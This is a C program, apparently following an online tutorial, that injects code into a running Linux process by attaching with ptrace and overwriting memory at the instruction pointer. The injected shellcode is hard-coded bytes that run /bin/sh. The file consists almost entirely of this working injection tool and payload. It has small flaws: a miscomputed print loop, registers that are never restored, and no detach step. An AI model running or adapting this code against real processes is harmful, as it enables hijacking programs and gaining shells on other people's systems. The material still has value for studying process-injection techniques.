/* Replicating this example:
 * https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be
 */

#include <sys/types.h>

/* C standard library */
#include <errno.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* POSIX */
#include <unistd.h>
#include <sys/user.h>
#include <sys/wait.h>

/* Linux */
#include <syscall.h>
#include <sys/ptrace.h>

#define SHELLCODE_SIZE 32

unsigned char *shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";

int inject_code (pid_t pid, unsigned char *src, void *dst, int len) {
  int i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++) {
    if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
      perror ("ptrace (POKETEXT) : ") ;
      return -1;
    }
  }
  return 0;
}

int main (int argc, char *argv[]) {
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2) {
      fprintf (stderr, "Usage: \n\t%s pid\n", argv[0]);
      exit (1);
  }
  target = atoi (argv[1]);
  printf("+ Tracing process %d\n", target);

  if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
    perror ("ptrace(ATTACH) : ");
    exit (1);
  }
  printf("+ Waiting for process....");
  wait (NULL);

  printf ("+ Getting Registers \n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0) {
    perror ("ptrace(GETREGS) : ");
    exit (1);
  }
  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);

  for(size_t count = 0; count < sizeof &shellcode/sizeof shellcode; count++)
    printf("%02x", shellcode[count]);
  printf("\n");

  inject_code (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;
}

